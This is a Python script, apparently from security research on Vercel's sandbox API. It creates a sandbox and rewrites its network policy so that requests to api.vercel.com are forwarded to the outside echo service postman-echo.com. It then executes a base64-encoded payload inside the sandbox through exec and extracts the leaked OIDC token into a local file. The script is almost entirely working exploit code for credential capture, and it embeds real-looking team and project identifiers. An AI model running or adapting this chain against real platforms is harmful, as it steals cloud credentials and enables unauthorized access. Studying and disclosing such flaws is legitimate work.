# 实验G2完整流程: 创建沙箱 -> update(startsWith /v2 + forwardURL=postman-echo/headers)
# -> 沙箱请求 api.vercel.com/v2/user -> 转发捕获 OIDC token
import json, base64, pathlib, urllib.request, urllib.error, re

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=60) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:500]

NAME = "expg2"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org", "api.vercel.com"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/network-policy?teamId={TEAM}",
           {"allow": {"api.vercel.com": [
               {"match": {"path": {"startsWith": "/v2"}},
                "forwardURL": "https://postman-echo.com/headers"}]}})
print("update:", c, r[:150])

payload = base64.b64encode(pathlib.Path("exp_g2.py").read_bytes()).decode()
body = {"command": "python3", "args": ["-c", f"import base64;exec(base64.b64decode('{payload}').decode())"],
        "wait": True, "logs": True, "timeout": 60000}
c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
print("cmd:", c)
out = ""
for line in r.splitlines():
    line = line.strip()
    if not line:
        continue
    try:
        d = json.loads(line)
        if d.get("stream") in ("stdout", "stderr"):
            out += d.get("data", "")
        elif d.get("stream") == "command":
            print("EXIT:", d.get("command", {}).get("exitCode"))
    except Exception:
        print(line[:300])

m = re.search(r"TOKEN_START\n(.*?)\nTOKEN_END", out, re.S)
if m:
    tok = m.group(1).strip()
    print("TOKEN_LEN:", len(tok))
    if tok:
        open("_oidc_token.txt", "w").write(tok)
        print("token saved to _oidc_token.txt")
else:
    print("NO TOKEN. output head:", out[:800])
print("FULL_OUT_HEAD:", out[:1500])
